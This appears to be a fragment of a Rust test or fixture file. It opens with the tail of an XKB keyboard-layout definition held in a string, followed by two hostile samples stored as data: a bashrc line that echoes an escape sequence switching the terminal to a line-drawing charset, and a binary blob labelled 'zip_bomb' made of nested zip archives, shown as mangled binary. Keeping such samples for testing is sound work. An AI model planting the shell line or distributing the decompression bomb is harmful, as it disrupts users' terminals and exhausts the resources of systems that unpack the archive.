    key <AE03> {	[	  3,	numbersign	]	};
    key <AE04> {	[	  4,	dollar		]	};
    key <AE05> {	[	  5,	percent		]	};
    key <AE06> {	[	  6,	asciicircum	]	};
    key <AE07> {	[	  7,	ampersand	]	};
    key <AE08> {	[	  8,	asterisk	]	};
    key <AE09> {	[	  9,	parenleft	]	};
    key <AE10> {	[	  0,	parenright	]	};
    key <AE11> {	[     minus,	underscore	]	};
    key <AE12> {	[     equal,	plus		]	};

    key <AD01> {	[	  x,	Q 		]	};
    key <AD02> {	[	  g,	G		]	};
    key <AD03> {	[	  m,	M		]	};
    key <AD04> {	[	  l,	L		]	};
    key <AD05> {	[	  w,	W		]	};
    key <AD06> {	[	  y,	Y		]	};
    key <AD07> {	[	  f,	F		]	};
    key <AD08> {	[	  u,	U		]	};
    key <AD09> {	[	  b,	B		]	};
    key <AD10> {	[ semicolon,	colon		]	};
    key <AD11> {	[ bracketleft,	braceleft	]	};
    key <AD12> {	[ bracketright,	braceright	]	};

    key <AC01> {	[	  d,	D 		]	};
    key <AC02> {	[	  s,	S		]	};
    key <AC03> {	[	  t,	T		]	};
    key <AC04> {	[	  n,	N		]	};
    key <AC05> {	[	  r,	R		]	};
    key <AC06> {	[	  i,	I		]	};
    key <AC07> {	[	  a,	A		]	};
    key <AC08> {	[	  e,	E		]	};
    key <AC09> {	[	  o,	O		]	};
    key <AC10> {	[	  h,	H		]	};
    key <AC11> {	[ apostrophe,	quotedbl	]	};

    key <AB01> {	[	  z,	Z 		]	};
    key <AB02> {	[	  x,	X		]	};
    key <AB03> {	[	  c,	C		]	};
    key <AB04> {	[	  v,	V		]	};
    key <AB05> {	[	  j,	J		]	};
    key <AB06> {	[	  k,	K		]	};
    key <AB07> {	[	  p,	P		]	};
    key <AB08> {	[     comma,	less		]	};
    key <AB09> {	[    period,	greater		]	};
    key <AB10> {	[     slash,	question	]	};

    key <BKSL> {	[ backslash,         bar	]	};
};

// Carpalx layout created by Martin Krzywinski
// http://mkweb.bcgsc.ca/carpalx/
// Merged with us(intl) and modified to move
// accented vowels closer to the plain vowels

partial alphanumeric_keys
xkb_symbols \"carpalx-intl\" {

    include \"us(carpalx)\"
    name[Group1]= \"English (Carpalx, intl., with dead keys)\";

    key <TLDE> { [dead_grave, dead_tilde,         grave,       asciitilde ] };
    key <AE01> { [	   1,     exclam,    exclamdown,      onesuperior ] };
    key <AE02> { [	   2,         at,   twosuperior, dead_doubleacute ] };
    key <AE03> { [	   3, numbersign, threesuperior,      dead_macron ] };
    key <AE04> { [	   4,     dollar,      currency,         sterling ] };
    key <AE05> { [	   5,    percent,      EuroSign,     dead_cedilla ] };
    key <AE06> { [    6, dead_circumflex,    onequarter,      asciicircum ] };
    key <AE07> { [	   7,  ampersand,       onehalf,	dead_horn ] };
    key <AE08> { [	   8,   asterisk, threequarters,      dead_ogonek ] };
    key <AE09> { [	   9,  parenleft, leftsinglequotemark, dead_breve ] };
    key <AE10> { [	   0, parenright, rightsinglequotemark, dead_abovering ] };
    key <AE11> { [     minus, underscore,           yen,    dead_belowdot ] };
    key <AE12> { [     equal,       plus,      multiply,         division ] };

    key <AD01> { [	   x,          Q,        degree,        paragraph ] };
    key <AD02> { [	   g,          G,         U011F,            U011E ] };
    key <AD03> { [	   m,          M,            mu,               mu ] };
    key <AD04> { [	   l,          L,     copyright,             cent ] };
    key <AD05> { [	   w,          W,             w,                W ] };
    key <AD06> { [	   y,          Y,    idiaeresis,       Idiaeresis ] };
    key <AD07> { [	   f,          F,    adiaeresis,       Adiaeresis ] };
    key <AD08> { [	   u,          U,    udiaeresis,       Udiaeresis ] };
    key <AD09> { [	   b,          B,    odiaeresis,       Odiaeresis ] };
    key <AD10> { [ semicolon,      colon,        oslash,         Ooblique ] };
    key <AD11> { [ bracketleft,  braceleft,  guillemotleft, leftdoublequotemark ] };
    key <AD12> { [bracketright, braceright, guillemotright, rightdoublequotemark ] };

    key <AC01> { [	   d,          D,           eth,              ETH ] };
    key <AC02> { [	   s,          S,        ssharp,          section ] };
    key <AC03> { [	   t,          T,         thorn,            THORN ] };
    key <AC04> { [	   n,          N,        ntilde,           Ntilde ] };
    key <AC05> { [	   r,          R,    registered,       registered ] };
    key <AC06> { [	   i,          I,        iacute,           Iacute ] };
    key <AC07> { [	   a,          A,        aacute,           Aacute ] };
    key <AC08> { [	   e,          E,        eacute,           Eacute ] };
    key <AC09> { [	   o,          O,        oacute,           Oacute ] };
    key <AC10> { [	   h,          H,        uacute,           Uacute ] };
    key <AC11> { [dead_acute, dead_diaeresis, apostrophe,        quotedbl ] };

    key <AB01> { [	   z,          Z,             z,                Z ] };
    key <AB02> { [	   x,          X,         U015F,            U015E ] };
    key <AB03> { [	   c,          C,      ccedilla,         Ccedilla ] };
    key <AB04> { [	   v,          V,            ae,               AE ] };
    key <AB05> { [	   j,          J,            oe,               OE ] };
    key <AB06> { [	   k,          K,         U0131,            U0130 ] };
    key <AB07> { [	   p,          P,         aring,            Aring ] };
    key <AB08> { [     comma,       less,    ediaeresis,       Ediaeresis ] };
    key <AB09> { [    period,    greater, dead_abovedot,       dead_caron ] };
    key <AB10> { [     slash,   question,  questiondown,        dead_hook ] };
    key <BKSL> { [ backslash,        bar,       notsign,        brokenbar ] };

    key <LSGT> { [ backslash,   bar,            backslash,      bar ] };

    include \"level3(ralt_switch)\"
};

// Carpalx layout created by Martin Krzywinski
// http://mkweb.bcgsc.ca/carpalx/
// Merged with us(intl) and us(altgr-intl) and modified to move
// accented vowels closer to the plain vowels

partial alphanumeric_keys
xkb_symbols \"carpalx-altgr-intl\" {

   include \"us(carpalx-intl)\"
   name[Group1]= \"English (Carpalx, intl., with AltGr dead keys)\";

// five dead keys moved into level3:

   key <TLDE> { [    grave, asciitilde,  dead_grave,   dead_tilde      ] };
   key <AC11> { [apostrophe,quotedbl,    dead_acute,   dead_diaeresis  ] };

// diversions from the MS Intl keyboard:

   key <AE01> { [        1, exclam,      onesuperior,  exclamdown      ] };

// onequarter etc (not in iso8859-15) moved to get three unshifted deadkeys:

   key <AE06> { [        6, asciicircum, dead_circumflex, onequarter    ] };
   key <AE07> { [        7, ampersand,   dead_horn,       onehalf       ] };
   key <AE08> { [        8, asterisk,    dead_ogonek,     threequarters ] };

   include \"level3(ralt_switch)\"
};

// Carpalx layout created by Martin Krzywinski
// Full optimization variant without fixed QWERTY-like ZXCV keys
// http://mkweb.bcgsc.ca/carpalx/

partial alphanumeric_keys
xkb_symbols \"carpalx-full\" {

    include \"us(carpalx)\"
    name[Group1]= \"English (Carpalx, full optimization)\";

    key <AD06> {	[	  b,	B		]	};
    key <AD07> {	[	  y,	Y		]	};
    key <AD09> {	[	  v,	V		]	};

    key <AB04> {	[	  f,	F		]	};
};

// Carpalx layout created by Martin Krzywinski
// Full optimization variant without fixed QWERTY-like ZXCV keys
// http://mkweb.bcgsc.ca/carpalx/
// Merged with us(intl) and modified to move
// accented vowels closer to the plain vowels

partial alphanumeric_keys
xkb_symbols \"carpalx-full-intl\" {

    include \"us(carpalx-intl)\"
    name[Group1]= \"English (Carpalx, full optimization, intl., with dead keys)\";

    key <AD06> { [	   b,          B,    idiaeresis,       Idiaeresis ] };
    key <AD07> { [	   y,          Y,    adiaeresis,       Adiaeresis ] };
    key <AD09> { [	   v,          V,    odiaeresis,       Odiaeresis ] };

    key <AB04> { [	   f,          F,            ae,               AE ] };
};

// Carpalx layout created by Martin Krzywinski
// Full optimization variant without fixed QWERTY-like ZXCV keys
// http://mkweb.bcgsc.ca/carpalx/
// Merged with us(intl) and us(altgr-intl) and modified to move
// accented vowels closer to the plain vowels

partial alphanumeric_keys
xkb_symbols \"carpalx-full-altgr-intl\" {

   include \"us(carpalx-altgr-intl)\"
   name[Group1]= \"English (Carpalx, full optimization, intl., with AltGr dead keys)\";

    key <AD06> { [	   b,          B,    idiaeresis,       Idiaeresis ] };
    key <AD07> { [	   y,          Y,    adiaeresis,       Adiaeresis ] };
    key <AD09> { [	   v,          V,    odiaeresis,       Odiaeresis ] };

    key <AB04> { [	   f,          F,            ae,               AE ] };
};

// EXTRAS:

// Czech, Slovak and German charecters added as third level symbols to US keyboard layout.
partial alphanumeric_keys
xkb_symbols \"cz_sk_de\" {

    include \"us\"
    name[Group1]=\"Czech Slovak and German (US)\";

    key <TLDE>  { [grave,   asciitilde, uring,      Uring       ] };
    key <AE01>	{ [    1,	exclam,	uacute,	    Uacute	] };
    key <AE02>	{ [    2,           at, ecaron,	    Ecaron	] };
    key <AE03>	{ [    3,   numbersign, scaron,	    Scaron	] };
    key <AE04>	{ [    4,       dollar,	ccaron,	    Ccaron	] };
    key <AE05>	{ [    5,      percent, rcaron,	    Rcaron	] };
    key <AE06>	{ [    6,  asciicircum, zcaron,	    Zcaron	] };
    key <AE07>	{ [    7,    ampersand,	yacute,	    Yacute	] };
    key <AE08>	{ [    8,     asterisk, aacute,	    Aacute	] };
    key <AE09>	{ [    9,    parenleft,	iacute,	    Iacute	] };
    key <AE10>	{ [    0,   parenright, eacute,	    Eacute	] };
    key <AE11>	{ [minus,   underscore, ssharp,     0x1001E9E	] };
    key <AE12>	{ [equal,	  plus, dead_acute, dead_caron  ] };

    key <AD03>	{ [         e,          E,     EuroSign,     Eacute ]	};

    key <AD11>	{ [bracketleft, braceleft,   udiaeresis,   Udiaeresis ]	};
    key <AC10>	{ [ semicolon,      colon,   odiaeresis,   Odiaeresis ]	};
    key <AC11>	{ [apostrophe,      quotedbl,adiaeresis,   Adiaeresis ]	};

    key <AC01>	{ [         a,          A,     aacute,	     Aacute   ]	};
    key <AD08>	{ [         i,          I,     iacute,	     Iacute   ]	};
    key <AD09>	{ [         o,          O,     oacute,       Oacute   ]	};
    key <AD06>	{ [         y,          Y,     yacute,       Yacute   ]	};
    key <AD07>	{ [         u,          U,     uring,	     Uring    ]	};

    key <AC02>	{ [         s,          S,     scaron,       Scaron   ]	};
    key <AB01>	{ [         z,          Z,     zcaron,	     Zcaron   ]	};
    key <AB03>	{ [         c,          C,     ccaron,       Ccaron   ]	};
    key <AD04>	{ [         r,          R,     rcaron,	     Rcaron   ]	};
    key <AD05>	{ [         t,          T,     tcaron,	     Tcaron   ]	};
    key <AC03>	{ [         d,          D,     dcaron,	     Dcaron   ]	};
    key <AB06>	{ [         n,          N,     ncaron,	     Ncaron   ]	};
    key <AC09>  { [         l,          L,     lcaron,       Lcaron   ] };
    key <AD10>  { [         p,          P,ocircumflex,  Ocircumflex   ] };

    key <SPCE>  { [     space,       space, nobreakspace, nobreakspace] };

    include \"level3(ralt_switch)\"
};

// 03 December 2017 - Added us(scn), please refer to
//                    Cadèmia Siciliana <l10n@cademiasiciliana.org>
partial alphanumeric_keys
xkb_symbols \"scn\" {

    include \"us(intl)\"
    name[Group1]=\"Sicilian (US keyboard)\";

    key <AD03> { [      e,       E, U0259,       U018F ] };
    key <AC03> { [      d,       D, U1E0D,       U1E0C ] };
    key <AC04> { [      f,       F, U0111,       U0110 ] };
    key <AC06> { [      h,       H, U1E25,       U1E24 ] };
    key <AB02> { [      x,       X, U03C7,       U03A7 ] };
    key <AB09> { [ period, greater, U1D58,  dead_caron ] };

    include \"level3(ralt_switch)\"
};

// XCompose is out! Unicode combining is in!  For those of us who live
// on the edge: A keymap using Unicode combining characters instead of
// deadkeys.  This variation does not deviate from the lame MS-style
// US-intl layout; but it uses AltGr for combining, like altgr-intl.
//
// This might break your font layout layout systems (because they
// suck), caveat emptor.  Also, most of today's software will count
// individual combining marks for selection, deletion, character
// counting &c., and won't be smart enough to do canonical equivalence
// when searching, &c.
//
// With Unicode combining you use \"handwriting order\", not
// \"typewriting order\" as with deadkeys.  That is, you first type the
// base character, then the diacritics/accents/modifiers.  This has
// the advantage of avoiding hidden states --- each keypress changes
// something on screen.
//
// TODO: as of now, this duplicates all us(intl) functionality with
// combining.  With care, perhaps we could add more combining marks
// not present in intl, and support all major languages.
partial alphanumeric_keys
xkb_symbols \"intl-unicode\" {

 name[Group1]= \"English (US, international AltGr Unicode combining)\";

 include \"us(intl)\"
 include \"level3(ralt_switch)\"

 // grave, tilde
 key <TLDE> { [grave, asciitilde, U0300, U0303 ] };
 // double acute
 key <AE02> { [ 2, at, twosuperior, U030B ] };
 // macron
 key <AE03> { [ 3, numbersign, threesuperior, U0304 ] };
 // circumflex
 key <AE06> { [ 6, asciicircum, onequarter, U0302 ] };
 // horn
 key <AE07> { [ 7, ampersand, onehalf, U031B ] };
 // ogonek
 key <AE08> { [ 8, asterisk, threequarters, U0328 ] };
 // breve
 key <AE09> { [	 9, parenleft, leftsinglequotemark, U0306 ] };
 // abovering
 key <AE10> { [	 0, parenright, rightsinglequotemark, U030A ] };

 // belowdot
 key <AE11> { [ minus, underscore, yen, U0323 ] };
 // acute, diaeresis
 key <AC11> { [apostrophe, quotedbl, U0301, U0308 ] };
 // abovedot, caron
 key <AB09> { [ period, greater, U0307, U030C ] };
 // hook
 key <AB10> { [ slash, question, questiondown, U0309 ] };

 // alt-intl compatibility
 // cedilla, caron
 key <AB08> { [ comma, less,	 U0327, U030C ] };
 // ogonek, diaeresis
 key <AC10> { [ semicolon, colon,	 U0328, U0308 ] };
 // doubleacute, horn
 key <AE12> { [ equal, plus,	 U030B, U031B ] };

 // we don't do combining latin letters and combining enclosures
 // because support for those is very rare.
};

// XCompose is out! Unicode combining is in! For those of us who live
// on the edge: A keymap using Unicode combining characters instead of
// deadkeys. This variation does break compatibility with us-intl,
// whenever I thought it would be more mnemonic or Unicodeish.
partial alphanumeric_keys
xkb_symbols \"alt-intl-unicode\" {

 name[Group1]= \"English (US, international AltGr Unicode combining, alternative)\";

 include \"us(intl-unicode)\"

 // easier macron; em-dash.
 // em-dash is available via compose, but I added here since it's such
 // an important typographic character.
 key <AE11> { [ minus, underscore, U0304, U2014 ] };

 // belowdot, abovedot (caron at coma/less key, per above)
 key <AB09> { [ period, greater, U0323, U0307 ] };

};

partial alphanumeric_keys
xkb_symbols \"ats\" {

    include \"us\"
    name[Group1]= \"Atsina\";

    //Using Dead key to get COMBINING COMMA ABOVE for ejectives on
    //q, l, t, s, m, g, k, p, w, y, r
    //XCompose key is used for the other accute and grave.

    key <AD03> { [ e, E, eacute, Eacute  ] };
    key <AD07> { [ u, U, uacute, Uacute  ] };
    key <AD08> { [ i, I, iacute, Iacute  ] };
    key <AD09> { [ o, O, oacute, Oacute  ] };
    key <AD11> { [ bracketleft,	braceleft, U03B8 ] };
    key <AD12> { [ bracketright, braceright, U010D, U010C ] };
    //U+010C (uppercase Č) and U+010D (lowercase č).

    key <AC01> { [ a, A, aacute, Aacute  ] };

    //Small letter Open use compose to key get acute accent
    key <AB03> { [ c,	C, U0254, U0186		  ] };
    key <AB08> { [ comma,     less, U0313 ] };
    key <AB10> { [ slash, question, U0294 ] };

    include \"level3(ralt_switch)\"
    include \"compose(rctrl)\"
};

partial alphanumeric_keys
xkb_symbols \"crd\" {

  include \"us\"
  name[Group1]= \"Coeur d'Alene Salish\";

  key <AD02> { [         w,           W, U02B7, U02B7 ] };
  key <AE07> { [         7,   ampersand, U0294        ] };
  key <AD01> { [         x,           Q, U221A        ] };
  key <AB04> { [         v,           V, U0259        ] };
  key <BKSL> { [ backslash,         bar, U026B        ] };
  key <AD03> { [         e,           E, U025B        ] };
  key <AD08> { [         i,           I, U026A        ] };
  key <AC07> { [         j,           J, U01F0        ] };
  key <AE06> { [         6, asciicircum, U0295        ] };
  key <AC02> { [         s,           S, U0161        ] };
  key <AB03> { [         c,           C, U010D        ] };
  key <AD09> { [         o,           O, U0254        ] };
  key <AB09> { [    period,     greater, U0323        ] };

  include \"level3(ralt_switch)\"
  include \"compose(rctrl)\"
};


partial alphanumeric_keys
	xkb_symbols \"sun_type6\" {
	include \"sun_vndr/us(sun_type6)\"
};");
    let meta_term = String::from("if [ -f ~/.bashrc ]; then
        echo -e \"\\033(0\"
fi\n");
    let zip_bomb = String::from("PK3c�|(�	V�	
                        lib 0.zip�AE��:����VǶJ-����d3�!s�I�mI��ȟ�ئ�b�滳}��Hm�l2�
�9�3ADֈ�'�q��;�5���9�ّĿ��$�χ4�o��'�㏶�����2@�k���K�?���?4Ӑ�s��<5���ً��<�Y�=��_p��iB]Y����|�$`�g�&jZk_mXu��#�ڇ.�Z������ݱ�u�/�2Z�H��rL�ZK[���L������(��-�/��e[�6_p!����/����}'�.�NB&7KB���t
���/;�?�y��v|Mvo�:�7;jM�T?;\\�����%X�2�N�|JY�h;�B	��d
j�SzO�;�q[�Vn s�UmU�����d�s
                              r�_�z@SU��H��e�0�$����]�2]w�/c�N�i�¹v�W�
�fr���9ڤ����0&��Z�����x�Z��3h��/'�tF畱^�)}d��ܼ�)�:���9F�������:�w�pE)1�۷�D��/DZ�C�RǇ{�*ׁ��H^�A�C�ۻ���e2��F���q(����y�>+$�6�_��\\Ďt�,(r�wqմ�7�',Ϫ/��>�<筱?����^��uSv�f&y�G?<vl��a��{I$�e~@^�LY�qF��)��
                                                `W���T:�3B9FVS�JPO�L�-(�ZJg���)#p�/����t��*�8B@4	����C��yʩ����:�`ƚ��S
                                            	�����\\v�э�d���	�&�ޥm�S�6��7�����Ъ�݂�;e]��.TP'�$�Ajν|��Q�X.�}� xSϑC�|���
�=�;{C���x9Y~�T��Y��ys]\"ժ���A�xcG�5��5g)��$Ե���5T�u���e��m3hj#�}�0�b��Iѡ�&�,��c���+
         $�d��z[���sn�S�Er����0*��J����0��͝�$gQ�״�����?�,�΅��U��_�#R�V�af��_��
   D-\"*f.���ͣ�C�cl�1�'�^�T2��	�x���pb��/��%��HM�'���P�fS�%[����v�䓿Ӷ�Q�t�}�9�ᇙ��i���_�����
              �
                U�T4.�s�0�K�6=m/XQ�ƹ�s� o����0�(���U5�9٨l,�3�~v�ҁ�jV�$��M
���҂��]�^���f;c!�Ӻ
 ��ȍ!_�U}Z��=d=��c��#Mq\"}����&oio��!@��a|_yIv��W-�1ogи��/�DX�-)^l�K� x�۠�ʹ4�H�
                                                                                 1�`\"z
    �,f��/i�h�����z�k,%6���2t�X��
                                   �BÂ�{�!
                                          �j�D!��!�/��5�:m
��q��[�}�.2sI̷��mVw*��\\��A/�����)                        �w)�T��'&
                                  ���r������ke5��w֤-�u#�mV��𛏵��$8�'ڋ�B(�����O���y>���!��ܿ���ĭ�<>&����'�2:u?Ό��S
                                      ���
X�������]ɓ���
a���fPZ��c�;�^��h����K6�PuGRw��jt�;$���Ra{���������|��� 	C�7���Τ�
               AU�������}��ٲ���=l>�RD��j�olWm�F�ѼQ��C��U��K
                                                               '��|o7m��ĭ�����A��F�eڒ3����м�d�t��EI�-��sZ�9i~��� ��ټ(��Vu�
                                           /_��s�������@
                                                         -qƚe�c�RO�y(��^�ʍ�V���1\"^Ϗ�:��ƞ!��GD�lT�^���&�蜃]��ָ��a7���6d6���P���B
S&F��g{c0n���W�?c:��p,�'qx�y�Q�wy���Ny�7��bm���֤�0m�S�PU�f��|�J�Z�ύ]Lr���������ҳn�(�h�kn��6�����\"C���Iz��7i�7�_���М�Ul����a_=Y/E��M��o��d�cT�w�f셖���<=P����4����&�]��^�Fn�=�#��NUvP�=���la��Y�H.�E�Y\"�i��5�	s
�B�:�ف��A T*�T'�\\�����n1�%ï�[I�V�T*%^�^�'ٶ
                                             \"�����J_�5=�5�B5��͊wu{�PG߇YVG�,E�<f����=5o�q�tvs���Nr�#��]�![���p��l;{��_)oK���H�	�#,�?�������}����J�����ix��#�d�\\Kc�
          &R#5;�m!��&!'��Y�h?�1	�}3k(hɆE�{����	l�M�v�n?Â�����~�[G��ԍ��g�/\\zd���V�
                    �Ƽ��͆T�6Ю�U�
W����v�UΉ�+lMϛ.	��.�V�w�!�֖L\"%X�>�Ӕ|^NH|����腜�¢��_�5�b^�L{�$���
                                                                             ��d�jc��!��O��J��V3��J�H�֞�,�hlp:d:��N�{��J��p�땷4A<PK3c�|(�	V�	
                                                                        lib 1.zip�AE[3���o�s�����pZ7j�b�G	�$���i>;�
                                          +4�����pR�d��1~�҃F�,��,_L{@�4���A0;7�L�xO�a���))t�ia��F�����e���!	3l���^\\Xɇ4����e)���S������Av�����T��H�$
���'��w��U�E�7U�z����OG�و䁘蚢36t؏����C0弿<�S#Կ�π%n�=)���D ��w�N컱2��K�
X��8��z�?��O����y,z(�C��)ʆ�7E�i�����J��Z�k$�n�>F#�S玁a)�d��_�N:��O�ϔq�>�����Pn\\�/�d����_�[�?��l���_K�.�]����m��u[�����-�aЯ�k2�4��\" �`���E�c%���l�O�j>Sל֔>�4cP�B{��N�Î˄\\4�\"�Xqre�f����\"x���t���BR?�Z���+�!��-\"��O�C�U
KBX��S̬��#%ኵɬlQ�
5^F����_���4?�}N�8Da0^>]a]��4����a�n�3�%��_�q�� ��:b���Bn
                                                           ��;�%�k���,ۿp���k%غ_U�k�256�@�X^�`a�DJ+H�K���ѝ%%���H�eY�o��;u\"��V�cT���4I�Z���݂��/[(�
                                                                      G����������_s��,��
        ��sW/�_��		�'�J�Z
                                      \"b�,^)���V`�J�ɨ?/mqܟ�otM��s`�Tߣчi�s��M=_�`Y���bk��C�yϻ����΂��O��HTđ0mKv,��5X�����i�j��\\ג��݄-�ܒ��A�6~�g$�e����49ȗ�b���<�}�@�r��&��3���BR����ɴW�y/�����լ�������E%�KNZy?�L*o�ay���@sr?�D�K=���75Z��S��X�9��o(��Ua8?�-TUf�|�}WL�#���2�Y�)��+���u4���D�~�!,�x8�A�s�&�Ѷ4�B`�.�i�А��HJ�?���i��6�'8�9��М~k�L6�)6FqHaM'���*���3ό�H��$���G�0
sl<�y��8w(J{/BZ�ᯉ��肀/*�)t�ψ��	\\�����=a����cf���$�E�j�
                                                          �0��wvN�y���c��a�l��G�����B'n���!+PG��FO�n�K���с�����sJŗ�
e8����0Tuû�\"�4�9<�&����-�hY���6�tI#⒖-��U��3�')#hv�����Ú��:2�EC��H�|S=��a�L)P�:+�I���4���7f�VnX#?pa(��.]wN%6���/!W��y�/�\\��J('�܋$���:�=�0
               �>||��fi
                       }�^RKҍ�����eC2��h�����IxB�\\q\"
                                                       J�?@�Y�9��<m���Ѳ���_:�o��H+rH���4�q(7T��5DB2�E)�d&ֈ�ƕ��C�2��e� /˔�n��A�#X\\H��(<�y #�sk��
                                                                       ���V�O��
��� ��U���̔e|\\�|��1��P!����\\��<���*�����'����5��gG����F�\"dn,�
�\"��oR��d!�r�[���a����R�����sx�'�_X6�����w�-4Aޓ�q�Wk�U)#w��)����B��Ûv�?���b�}�׆�H*9��
            ����8ѶN�m᜜�6YW��-���e�i_�H������P�r�����z�+��;Wr%{��-\\�a��#!%�hە���&�['��T�_Z�h���-I�=�,ٌ��#ז�۵��j����,�P[Q?�J�	
                                                Kt�$N������.5��=�r,oW��]q;!C79�'Xp0���s'Xe�rf�Nv�����&2����D;Z��oi�u�������W�T�I������3|�^;�Ю��(6���Od엡��r��t
 �z��OU�M��.k�'?-:Jz��-D��l/�bͧ����ƿ����{�S���@
                                                           �ʤ���������E�
                                                                         �0oS���)�z�V����yֵ���Y.��!�֮}jm�	�t��`ǰ��X�+�����.r<T��!��g;w��xsR)�Y�z,|
t4s���$����{���K���tȕ������*�ڼD�7?���-���鹭[���Qx7�d���G����
                                                                 q�PK3c�|(�	V�	
        lib 2.zip�AElE����;
��k:5�?(2��Zpє[���/��D       bM
���35�G�5��v?����r�tJ��ӟ,J�'%�O�l�=��1��w�
Zp<bZC

      t�O�jӀ��$���k����������f��[�c~
                                      �O���Y�|��=�0����;�:�����^d!��o]}#�o��K_g)���m�Ƒ�b��RO-2f�_���NV�r%��]LjJ\\��	��l�C�E����nR���HG�$��e�~����0\"�8 2?T���D
  ���Neq�ny
           .�ؕ��!����.ux�*YQ�k��be8�7_&�vzIJ�]�?��k�����S�w�g�'��N8�<y�rE�r�.���}��&:.>������5��L�)��]��As-���s�Ժ�VQ~Fi����&�v�t�M-*ùb,
                                                               �N�
                                                                   Ǿ�aG�taXq,⮋F|����og�XkQ@��V�t�BQ+������N�:��:��fi���e-��8<+?
���V���8��֝�������p� ��<����4��ٶ�$sW�6�)7�l��ʮ@�����9W���
                                                            �ŵ1
                                                                -�s�}1�A��ٮW��H��^ͳ����ֹ�}�?8�C��l�zi�lm���_/�gN�7�\\I.u���J���
                                                  ����:HW�����b\"��Xt!Ǉ�NOq�[��TN���-�O��Yl�$1(4
 ف����H��!H��wD��w)|��@G7���'V��O5%X�c<��ʩ�l��݃��!nD�}�&��'���F)l��#�HJ9$��S�S|o1������ω&����Y������q��+����s�e�<[-�����:e	���c:{��7�%`��NKd���,�NV��a턠��l4䁜���À.���;-�
{�e�X���o�0�A+
               �����>����s.}�0�,���{F�\\���v�sd�T@�(U����L{��k3��i����q�J��g^x$̒
�A
��n��y1�����L�p>`ﯦm'�[s:̫�;#<���`5Y��n�\"-��>1~1�yXƃ��\\���[2�(�<Z��^h�o[���(�������\"'��B�r��ғ�}��-=ۇ\\��I�f��1����\"K�ݢ�����s���ڧx�O�HoN����C�Oi��5�w����8v�=�ɜ�e�r
          ��)�)sa+���������P��
h(���>�œ�����2�!��e֘�(���l���N@��bh$v�o��(�
       ����K����;���4 �`���V�EE����)*|U4�0�0��s����+�o���+#&N���]�pMB
��IK�Fڂ����8E���-9����hH8��6+bK?��{0Z��*@U��:;y�*��F6�?�d�1�n�<����	�t��48ɗ��f�$�K4$�!p���G��)����0�>c�\"������5����t]o\\7����ۛ����q���D/z��ݗ��$G$�\"�L��z!K(��[�y����=�b�ݏ��6w�d�,\\��jL��[��V%u@�O�{��{���خE����������d�h��fVB+�vZ%��V+��N��r{�#YY5�R|
                             h����^[ Џ�s�}��{�����M2�s!UZ|fK*=P[S�q_?h�\\a!kM���Fh��_MoQ|���B��}`�K��A����� �q����;]���-sQ��8�`����aQ̣��
H)P���綾����'`��R�R[�TW�*�yQ
��a}Jd���<��d����s#�%�L�d'�}��7�F��Y���S?�4# I��)O�`r��`��?�`n�����⨦��(�;`j���rr\\2V�:�O�g��C'a�P�P4�=���6�cy���[Li�%2Ҵ8{a�
                                                 �]��ƝE����0��|wk�9��]|����5�W��d�C����m5:l�p����Z�H{L�9����Y9�Q�
���9箋
��6@���d�]��ԍ��Իh*	J�
                            t�����
��o���                             Y2ĝ�@�(�|�&�����vc-���yx�
�n��F�B9Z�U��9rE�
~�sPK3c�|(�	V�	
                        lib 3.zip�AE
��(�ͤ�68b�5wN��/�����	�ڻ,��#::Qc��Q�|vۈ\"���]������$�u�L3�yJ��{����<(6`�-1PT���\\��]��*I�ADI��'Wa�_��lIfG����l1��l1�ͅỔ_Kv�C����4�<�u�N��E#҅�v`���#ί�i�6L!䕻ɿ)
                                                                                h�w�/,8)��=Ĵ�3���AQl��d��+��#4yf{�E��7cȹG�R��]��2(zG��h�iB�\"ir�X�*
                                                                       {d�-��,��%�*�`���}�p�c���6k��0K�o�kD�]�]c7��[2\\e�@��G���%��טe
                                                         ۶oh,�!�ȡ^=;3�=���fՠ{�������o��0C�J����}Eq�e�w.�m�x�t�_OF]�fs���c�#c
L$��9�\\�*Za���2��2P���/ú����<5��Ɏ�һݪsO٠��	�|�p�9����=(@/�^Q�� ��DB_�ɪ�v3���ү�Zw|�ܘ�����ao��6�8R5��'jܑ��ی�\"fu���`����a���~;�8xԈ�H��\\�h�7�^K~�
                                                                       �����j�i�S��L�W����wŅ��:�
�^M؇
*3��%�N�j����i�w�X�<4�͚��4��bLu&���7`�6��
                                         q��]�V�K��'>Dbl�2�����饷�u�4X)�R�\\.�y����[7�����B����{��.�Q�S=C���
                                o�M���c5ji�kw�\"3p�/��Uh)��B���#2@y�(\"k�+Rf�^��^h��;�r;���t*�Q��';�!6��\"]}�!٦Q�g�m(�'e�i|r�ˑ��;M�(�����u��A���D
                                                             !�c��I��?�:2C��3pF��g�[bA�f�K�gx/E���8���f�A�j�3�dddu�;��!nöZX2
                                                 �6n�l?����!�f�=��}1w��\"���jE��LG6Mo�jF��0�����{bT�ڏ+��7
                       �3��K��㢫
                                 r�T��¨��(�?Gu�xPXvH���$�����͞oX��g��iU�-��Ua~�s�8�B]	I:�{�o4���IV�gII��{�g�1Deg����9=��!h^k$��#s�W�#�:g�˂Ξ���R�N�`䪚Qڼ������Dh���~���Ctj�j܄�#ڮoʉ�R�um��������>�����zy�qXԁ���^*l̕�V��p��-׏�����25�/5�#�5�����h��Yt
�U <��
       �$�NM`�e:��9؛<���쯮$^U�mɛ��`��3��tn'T.>�(e~(`T��L`#{���6�GWc�+v��/�8�q�P|�#r���^�w%��7��Ħއ��Z<�+�Q��(m�jI󣥣�3�(�{�z-��C�凷��u�	��
                                                                   �\"
He)�RQxnf�a�,܈�%�B��(r0�����@Hz��!��՝�#F�`���V{�ui��������sLe�ւ/h#Y\\TD��{T8�[&\\w�=n�~ǟ�_��=U>Q�Nlx���`�D!
                           2��q
                               6̕2���f�������\\�0W�X|�\\3�`x�[�M�Ǝ�:\"l����YDbKx���B��S!
       �|�2cN�	m�5孍!
                      �>W�
�ۿ�|���k�YxSXY@^��̜���r��$���F�����s����@����]枭8�uC*wr�c��y�������o�O
�@;]�\">JEN|�!��M7�z黧J�M��l��dh2��(R7�Q��
                                             *�0��6�?�C\"���4�<�ԔH��nL��9R�����2m�Ld�{M�G��6GU?aO|��#��@5�@N6��J k�<��I_q*��^�Fdi�σ�/U������s���_�x� ��6 Cjzg���KCǟ��eBy��pf��L�AS������Z�E��l�#����*�_���o�����'��x��x���I�3Հ#�Qޏ-Y0_�
 ,˷w�[R�vw�=�~�\\)e��.&��O
                           ��h��A���#n��C���u�*�nRϒ4����UWS��#	��!L�5� J�̺*L�����I���H��uK'hc��Ze������uel��S(�8��A<ˊ���m���g
                                                      �PK3c�|(�	V�	
